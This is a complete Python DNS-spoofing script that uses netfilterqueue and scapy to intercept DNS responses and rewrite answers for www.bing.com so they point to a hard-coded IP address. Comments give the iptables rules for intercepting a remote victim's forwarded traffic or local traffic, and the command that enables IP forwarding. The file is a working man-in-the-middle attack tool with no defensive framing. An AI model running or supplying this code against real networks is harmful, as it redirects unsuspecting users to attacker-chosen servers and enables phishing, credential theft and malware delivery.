#!/usr/bin/env python

# apt install python3-full
# python3 -m venv venv
# source venv/bin/activate
# pip install ......

import netfilterqueue
import scapy.all as scapy


def process_packet(pkt):
    scapy_packet = scapy.IP(pkt.get_payload())
    #print(scapy_packet.show())

    if scapy_packet.haslayer(scapy.DNSRR):          # DNSRR: response
        if scapy_packet.haslayer(scapy.DNSQR):
            qname = scapy_packet[scapy.DNSQR].qname     # DNSQR: question record
            if "www.bing.com" in str(qname):
                print("[+] Spoofing target")
                answer = scapy.DNSRR(rrname=qname, rdata="108.181.162.193")  # response
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1  # answers count

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                #del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len

                pkt.set_payload(bytes(scapy_packet))
    pkt.accept()

# targeting remote machine: iptables -I FORWARD -j NFQUEUE --queue-num 0
# targeting local machine:  iptables -I INPUT -j NFQUEUE --queue-num 0
#                           iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables --flush
# echo 1 > /proc/sys/net/ipv4/ip_forward

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

